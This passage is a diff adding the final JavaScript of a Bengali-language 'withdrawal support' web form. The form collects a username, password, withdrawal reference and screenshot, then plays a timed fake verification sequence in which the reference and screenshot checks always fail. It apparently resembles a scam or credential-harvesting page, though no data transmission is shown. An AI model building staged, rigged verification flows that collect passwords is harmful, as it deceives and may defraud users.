+        // === যাচাই আইটেম ===
+        function resetVerifyItems() {
+            [vUser, vPass, vRef, vScreen].forEach(item => {
+                item.className = 'verify-item';
+                item.querySelector('.v-icon').innerHTML = '<i class="fas fa-circle"></i>';
+            });
+        }
+
+        function setVerifyState(item, state) {
+            item.className = 'verify-item ' + state;
+            if (state === 'checking') {
+                item.querySelector('.v-icon').innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+            } else if (state === 'pass') {
+                item.querySelector('.v-icon').innerHTML = '<i class="fas fa-check"></i>';
+            } else if (state === 'fail') {
+                item.querySelector('.v-icon').innerHTML = '<i class="fas fa-times"></i>';
+            }
+        }
+
+        // === ফর্ম সাবমিট ===
+        supportForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            if (isVerifying) return;
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            const reference = referenceInput.value.trim();
+
+            if (!username) { showToast('ইউজার নাম আবশ্যক', 'warning'); usernameInput.focus(); return; }
+            if (!password) { showToast('পাসওয়ার্ড আবশ্যক', 'warning'); passwordInput.focus(); return; }
+            if (password.length < 4) { showToast('পাসওয়ার্ড কমপক্ষে ৪ অক্ষরের হতে হবে', 'warning'); passwordInput.focus(); return; }
+            if (!reference) { showToast('উত্তোলন রেফারেন্স আবশ্যক', 'warning'); referenceInput.focus(); return; }
+            if (!selectedFile) { showToast('স্ক্রিনশট আপলোড করুন', 'warning'); return; }
+
+            isVerifying = true;
+            submitBtn.classList.add('loading');
+            submitBtn.disabled = true;
+            failBanner.classList.remove('show');
+            resetVerifyItems();
+            verifyPanel.classList.add('show');
+
+            setTimeout(() => {
+                verifyPanel.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 200);
+
+            const isPassCorrect = password === CORRECT_PASSWORD;
+
+            setTimeout(() => setVerifyState(vUser, 'checking'), 400);
+            setTimeout(() => setVerifyState(vUser, 'pass'), 1400);
+            setTimeout(() => setVerifyState(vPass, 'checking'), 1800);
+            setTimeout(() => {
+                setVerifyState(vPass, isPassCorrect ? 'pass' : 'fail');
+            }, 2800);
+            setTimeout(() => setVerifyState(vRef, 'checking'), 3200);
+            setTimeout(() => setVerifyState(vRef, 'fail'), 4200);
+            setTimeout(() => setVerifyState(vScreen, 'checking'), 4600);
+            setTimeout(() => setVerifyState(vScreen, 'fail'), 5600);
+
+            setTimeout(() => {
+                submitBtn.classList.remove('loading');
+                submitBtn.disabled = false;
+                isVerifying = false;
+                failBanner.classList.add('show');
+                showToast('জমা সফল হয়নি - তথ্য যাচাইয় সমস্যা', 'error');
+                setTimeout(() => {
+                    failBanner.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 100);
+            }, 6200);
+        });
+
+        // === টোস্ট ===
+        function showToast(message, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            const icons = {
+                success: 'fa-check-circle',
+                error: 'fa-exclamation-circle',
+                warning: 'fa-exclamation-triangle'
+            };
+            toast.innerHTML = `<i class="fas ${icons[type]}"></i><span>${message}</span>`;
+            toastContainer.appendChild(toast);
+            setTimeout(() => {
+                toast.classList.add('out');
+                toast.addEventListener('animationend', () => toast.remove());
+            }, 3500);
+        }
+
+        // === ইনপুট ফোকাস ===
+        document.querySelectorAll('.input-wrap input').forEach(input => {
+            input.addEventListener('focus', () => {
+                if (!input.classList.contains('input-correct') && !input.classList.contains('input-wrong')) {
+                    input.closest('.input-wrap').querySelector('i.field-icon').style.color = 'var(--accent)';
+                }
+            });
+            input.addEventListener('blur', () => {
+                if (!input.classList.contains('input-correct') && !input.classList.contains('input-wrong')) {
+                    input.closest('.input-wrap').querySelector('i.field-icon').style.color = '';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
